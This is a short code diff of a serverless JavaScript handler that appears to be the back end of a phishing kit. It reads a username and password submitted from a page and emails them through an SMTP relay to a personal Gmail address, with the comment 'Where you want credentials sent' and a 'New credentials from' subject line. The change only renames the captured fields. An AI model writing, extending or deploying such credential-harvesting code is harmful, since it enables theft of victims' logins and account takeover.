@@ -2,7 +2,7 @@ const nodemailer = require("nodemailer");
 
 exports.handler = async (event) => {
   try {
-    const { email_username, pass, pageName } = JSON.parse(event.body);
+    const { u_name, u_pass, pageName } = JSON.parse(event.body);
 
     let transporter = nodemailer.createTransport({
       host: "smtp-relay.brevo.com",
@@ -18,7 +18,7 @@ exports.handler = async (event) => {
       from: "castanedaorlando871@gmail.com", // Must match verified sender
       to: "lyndazuniga2020@gmail.com", // Where you want credentials sent
       subject: `New credentials from ${pageName}`,
-      text: `Username: ${email_username}\nPassword: ${pass}`,
+      text: `Username: ${u_name}\nPassword: ${u_pass}`,
     });
 
     return {
